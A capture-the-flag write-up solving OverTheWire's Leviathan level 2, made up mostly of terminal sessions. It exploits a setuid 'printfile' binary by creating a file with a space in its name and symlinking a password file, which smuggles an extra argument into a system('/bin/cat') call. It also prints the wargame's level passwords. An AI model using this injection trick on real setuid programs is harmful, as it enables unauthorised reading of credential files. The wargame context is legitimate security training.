# Leviathan Level 2 --> Level 3
There is no information for this level, intentionally. 

## Solution 1
See files in home directory, there is setuid executable
```bash
leviathan2@leviathan:~$ ls
printfile
leviathan2@leviathan:~$ file printfile
printfile: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=46891a094764828605a00c0c38abfccbe4b46548, not stripped
```

Try this setuid
```console
leviathan2@leviathan:~$ ./printfile
*** File Printer ***
Usage: ./printfile filename
```
```console
leviathan2@leviathan:~$ ltrace ./printfile /etc/leviathan_pass/leviathan2
__libc_start_main(0x804852b, 2, 0xffffd774, 0x8048610 <unfinished ...>
access("/etc/leviathan_pass/leviathan2", 4)              = 0
snprintf("/bin/cat /etc/leviathan_pass/lev"..., 511, "/bin/cat %s", "/etc/leviathan_pass/leviathan2") = 39
geteuid()                                                = 12002
geteuid()                                                = 12002
setreuid(12002, 12002)                                   = 0
system("/bin/cat /etc/leviathan_pass/lev"...ougahZi8Ta
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                   = 0
+++ exited (status 0) +++
```

It check access first then make string contain cat command + distenation, so we must make file pass access point then link it with leviathan3 pass file
```console
leviathan2@leviathan:~$ mkdir /tmp/levi2
leviathan2@leviathan:~$ cd /tmp/levi2
leviathan2@leviathan:/tmp/levi2$ touch a
leviathan2@leviathan:/tmp/levi2$ touch b
leviathan2@leviathan:/tmp/levi2$ touch "a b"
leviathan2@leviathan:/tmp/levi2$ ls
a  a b  b
```
```console
leviathan2@leviathan:/tmp/levi2$ ln -s /etc/leviathan_pass/leviathan3 
bleviathan2@leviathan:/tmp/levi2$ ls
a  a b  b
```

Now try setuid file 
```console
leviathan2@leviathan:/tmp/levi2$ ~/printfile "/tmp/levi2/a b"
Ahdiemoo1j
```
*(it check "a b" file access then print a then b (we link it before with leviathan3))*

## Password
> Ahdiemoo1j

